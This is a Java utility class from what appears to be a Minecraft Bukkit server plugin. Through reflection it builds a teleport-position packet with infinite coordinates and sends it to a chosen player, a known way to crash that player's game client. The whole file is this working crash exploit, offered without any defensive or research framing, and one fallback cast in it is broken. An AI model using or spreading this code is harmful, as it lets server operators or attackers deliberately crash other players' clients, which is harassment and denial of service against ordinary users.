package cn.starry.hub.utils;

import com.google.common.collect.Sets;
import java.lang.reflect.Method;
import java.util.Set;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class CrashUtil {
    public static void sendPacket(Player player, Object packet) {
        try {
            Object handle = player.getClass().getMethod("getHandle", new Class[0]).invoke((Object)player, new Object[0]);
            Object playerConnection = handle.getClass().getField("playerConnection").get(handle);
            playerConnection.getClass().getMethod("sendPacket", CrashUtil.getNMSClass("Packet")).invoke(playerConnection, packet);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static Class<?> getNMSClass(String name) {
        try {
            return Class.forName("net.minecraft.server." + Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3] + "." + name);
        }
        catch (ClassNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }

    public static Object getCrashPacket() {
        Class<?> PacketPlayOutPosition = CrashUtil.getNMSClass("PacketPlayOutPosition");
        Class<?> PacketPlayOutPositionEnum = CrashUtil.getNMSClass("PacketPlayOutPosition$EnumPlayerTeleportFlags");
        Object[] a = CrashUtil.getValues(PacketPlayOutPositionEnum);
        if (a == null) {
            a = (Object[])new Object();
        }
        Object packet = null;
        try {
            packet = PacketPlayOutPosition.getConstructor(Double.TYPE, Double.TYPE, Double.TYPE, Float.TYPE, Float.TYPE, Set.class).newInstance(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, Float.valueOf(90.0f), Float.valueOf(0.0f), Sets.newHashSet(a));
        }
        catch (Throwable e) {
            try {
                packet = PacketPlayOutPosition.getConstructor(Double.TYPE, Double.TYPE, Double.TYPE, Float.TYPE, Float.TYPE, Set.class, Integer.TYPE).newInstance(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, Float.valueOf(90.0f), Float.valueOf(0.0f), Sets.newHashSet(a), 0);
            }
            catch (Throwable e1) {
                try {
                    packet = PacketPlayOutPosition.getConstructor(Double.TYPE, Double.TYPE, Double.TYPE, Float.TYPE, Float.TYPE, Boolean.TYPE).newInstance(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, Float.valueOf(90.0f), Float.valueOf(0.0f), true);
                }
                catch (Throwable e2) {
                    try {
                        packet = PacketPlayOutPosition.getConstructor(Double.TYPE, Double.TYPE, Double.TYPE, Float.TYPE, Float.TYPE, Boolean.TYPE).newInstance(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, Float.valueOf(90.0f), Float.valueOf(0.0f), true);
                    }
                    catch (Throwable e3) {
                        packet = null;
                    }
                }
            }
        }
        return packet;
    }

    private static <E> E[] getValues(Class<?> enumClass) {
        Object o = null;
        try {
            Method m = enumClass.getDeclaredMethod("values", new Class[0]);
            m.setAccessible(true);
            o = m.invoke(null, new Object[0]);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return (E[]) o;
    }
}
